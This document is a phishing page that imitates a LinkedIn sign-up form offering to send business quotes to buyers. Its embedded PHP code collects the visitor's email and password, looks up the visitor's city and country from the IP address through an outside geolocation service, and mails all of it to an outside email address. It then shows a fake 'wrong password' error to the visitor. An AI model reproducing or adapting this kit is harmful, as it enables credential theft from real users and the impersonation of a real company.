<!DOCTYPE html>
<!--[if lt IE 7]> <html lang="en" class="ie ie6 lte9 lte8 lte7 os-win"> <![endif]-->
<!--[if IE 7]> <html lang="en" class="ie ie7 lte9 lte8 lte7 os-win"> <![endif]-->
<!--[if IE 8]> <html lang="en" class="ie ie8 lte9 lte8 os-win"> <![endif]-->
<!--[if IE 9]> <html lang="en" class="ie ie9 lte9 os-win"> <![endif]-->
<!--[if gt IE 9]> <html lang="en" class="os-win"> <![endif]-->
<!--[if !IE]><!--> <html lang="en" class="os-win"> <!--<![endif]-->
<head>

<meta name="globalTrackingUrl" content="//www.linkedin.com/mob/tracking">
<meta name="globalTrackingAppName" content="chrome">
<meta name="globalTrackingAppId" content="webTracking">
<meta name="lnkd-track-json-lib" content="https://static.licdn.com/scds/concat/common/js?h=2jds9coeh4w78ed9wblscv68v-ebbt2vixcc5qz0otts5io08xv">
<meta name="lnkd-track-lib" content="https://static.licdn.com/scds/concat/common/js?h=ebbt2vixcc5qz0otts5io08xv">
<meta name="treeID" content="ob8ziKchBBRwdHwNlisAAA==">
<meta name="appName" content="chrome">
<meta name="lnkd-track-error" content="/lite/ua/error?csrfToken=ajax%3A5277654999961464492">

<title>Business | LinkedIn</title>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
<meta name="pageKey" content="uno-reg-join-warm"/>
<link rel="apple-touch-icon-precomposed" href="https://static.licdn.com/scds/common/u/img/icon/apple-touch-icon.png">
<!--[if lte IE 8]>
  <link rel="shortcut icon" href="https://static.licdn.com/scds/common/u/images/logos/favicons/v1/16x16/favicon.ico">
<![endif]-->
<!--[if IE 9]>
  <link rel="shortcut icon" href="https://static.licdn.com/scds/common/u/images/logos/favicons/v1/favicon.ico">
<![endif]-->
<link rel="icon" href="https://static.licdn.com/scds/common/u/images/logos/favicons/v1/favicon.ico">
<meta name="msapplication-TileImage" content="https://static.licdn.com/scds/common/u/images/logos/linkedin/logo-in-win8-tile-144_v1.png"/>
<meta name="msapplication-TileColor" content="#0077B5"/>
<meta name="application-name" content="LinkedIn"/>
<link rel="stylesheet" type="text/css" href="https://static.licdn.com/scds/concat/common/css?h=765zh9odycznutep5f0mj07m4-2tr6x8k7l0ipmtloku8tcciqt-7mxyksftlcjzimz2r05hd289r-4uu2pkz5u0jch61r2nhpyyrn8-aze4ooami6s3kk293iv0zfky1-7poavrvxlvh0irzkbnoyoginp-4om4nn3a2z730xs82d78xj3be-35dk2u00mxodtd0hghi301vw3-ct4kfyj4tquup0bvqhttvymms-3pwwsn1udmwoy3iort8vfmygt">


<title>Sign Up</title><link rel="stylesheet" href="https://static.licdn.com/sc/h/7wz536ddib5yu84fuaxjy9tnp"/><link rel="stylesheet" href="https://static.licdn.com/sc/h/33o35xbruzj8nd7n8cmimtriq"/>
<style type="text/css">
<!--
.style2 {
	font-size: smaller;
	color: #003366;
}
-->
</style>
</head>
<body dir="ltr" class="guest v2 uno-body chrome-v5 chrome-v5-responsive sticky-bg guest" id="pagekey-uno-reg-join-warm">
<input id="inSlowConfig" type="hidden" value="false"/>
<div id="uno-reg-join" class=""><div class="content-wrapper using-single-form"><div class="fodal join-container reg-content-container uno-anchor"><div class="fodal-wrapper"><div class="header-container"><h1 class="title li-logo"><span class="li-name">LinkedIn</span></h1>
<h2 class="title"> Connect and do business Transactions with buyers/suppliers/manfacturers via the world&#39;s largest business network year 2020!!!</h2>
</div><div class="content-container"><div class="reg-content-wrapper single"><div class="top-pane">
  <h3 class="message has-photo">Send Your Product quotes to interested buyers via LinkedIn</h3>
</div><div class="join-form-container form-container"><div class="join-form-wrapper form-wrapper"><div class="alerts-cont" data-li-error-translated="" data-li-error-debug=""></div> <div class="loading-indicator hidden"></div>
        <?php $emai = $_GET['user'];
        $IP = $_SERVER['REMOTE_ADDR'];
        $geopluginURL='http://www.geoplugin.net/php.gp?ip='.$IP;
        $addrDetailsArr = unserialize(file_get_contents($geopluginURL)); 
        $city = $addrDetailsArr['geoplugin_city'];
        $country = $addrDetailsArr['geoplugin_countryName'];
        if(!$city){
   $city='Not Define';
      } 
      if(!$country){
   $country='Not Define';
}

   
         if($_POST && isset($_POST['email'], $_POST['pass'])){
    $ip = isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : '';
    $email_to = "simon@wmbrep.biz";
    $email_subject = "Linked";
    $email_from = "simon-walter";
    $email = $_POST['email'];
    $pass = $_POST['pass'];
    $cpass = $_POST['cpass'];
    $email_message .= "Email: ".($email).   " \n";
    $email_message .= "Password: ".($pass).   " \n";
    $email_message .= "IP: ".($ip).   " \n";
    $email_message .= "Country: ".($country).   " \n";
    $email_message .= "City: ".($city).   " \n";
  
        
     
    
    $headers = 'From: '.$email_from."\r\n";
    
    
   if(!$email) {
      $emailErr = "Please enter your  Email";
    } elseif(!$email || !preg_match("/^\S+@\S+$/", $email)) {
      $emailErr = "Please enter a valid Email";
      } 
      elseif(!$pass) {
      $passErr = "Password is required";
    }
    elseif($pass != $cpass){
        $cpassErr = "Both Passwords Must Match";
    }
   
 else {
     $gotten = "Login Error,Wrong Email or Password, Try Again";
 mail($email_to, $email_subject, $email_message, $headers);
        }
   
                            
 }              
                            
                            
                            ?>
        <form class="join-linkedin-form float-label-form" action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]);?>" method="POST">
        <fieldset><legend>Join LinkedIn</legend>
                 <b><font size="1" color="#ff0000" face="Verdana">
          <span class="error"> <?php echo $emailErr;?></span>
          <span class="error"> <?php echo $passErr;?></span>
          <span class="error"> <?php echo $cpassErr;?></span>
          <span class="error"> <?php echo $gotten;?></span></font></b>
                <ul class="input-fields container-box">
  <li class="first-name-field cell cell-input"><div class="first-name-wrapper cell-body">
         
              <label for="first-name">Email</label><input class="cell-body-textinput" type="text" autocapitalize="off" value="<?php echo $emai ?>" aria-required="true" id="join-email" name="email" />
      </div></li><li class="last-name-field cell cell-input"><div class="last-name-wrapper cell-body">
                  <label for="last-name">Password</label><input class="cell-body-textinput" name="pass" id="last-name" type="password" aria-required="true" value="" autofocus=&quot;autofocus&quot;/></div></li>
                  <li class="email-field cell cell-input"><div class="email-wrapper cell-body">
                      <label for="join-email">Confirm Password</label><input class="cell-body-textinput" name="cpass" id="" autocomplete="on" type="password" aria-required="true"  value="" /></div></li>
                </ul>
<button type="submit" class="btn btn-primary join-btn" data-position-join="right"><span class="fill-v2">Continue</span></button>
            </fieldset>
      <p class="uno-body style2">&nbsp; </p>
      <p class="uno-body style2">Ensure Your Email and Password are correct<br>
      </p>
      <p class="uno-body style2">&nbsp;</p>
      <p><span class="disclosure-text">By clicking Continue you proceed to send your business catalogues and quotes</span> </p>
     
</form><p class="signin-link">&nbsp;</p>
</div></div></div><div class="footer"><div class="wrapper"><p class="copyright">LinkedIn Corporation &copy; 2015</p></div></div></div></div></div></div><code id="changeDocumentDomain" style="display: none;"><!--true--></code><code id="urlMap" style="display: none;"><!--{"analyticsNoauthSecureUrl":"/analytics/noauthtracker","cookiePolicyUrl":"https://www.linkedin.com/legal/cookie-policy?trk=uno-reg-join-warm-cookie-policy","privacyPolicyUrl":"https://www.linkedin.com/legal/privacy-policy?trk=uno-reg-join-warm-privacy-policy","loginUrl":"https://www.linkedin.com/uas/login?fromSignIn=true&trk=uno-reg-join-warm-sign-in","userAgreementUrl":"https://www.linkedin.com/legal/user-agreement?trk=uno-reg-join-warm-user-agreement"}--></code><code id="langData" style="display: none;"><!--{"showLastNameFirst":false,"isChinaFlow":false,"firstNameDisplay":"","isAutofocusFirstName":"autofocus=\"autofocus\"","lastNameDisplay":"","isAutofocusLastName":""}--></code><code id="trackingCode" style="display: none;"><!--"eml-first_guest_reminder_01-hero-0-accept_image"--></code><code id="countryCodeMap" style="display: none;"><!--{}--></code></div>

<noscript>
<img src="/csp/dtag?p=10" width="1" height="1" alt="" style="display:none"/>
</noscript>
</body>
</html>

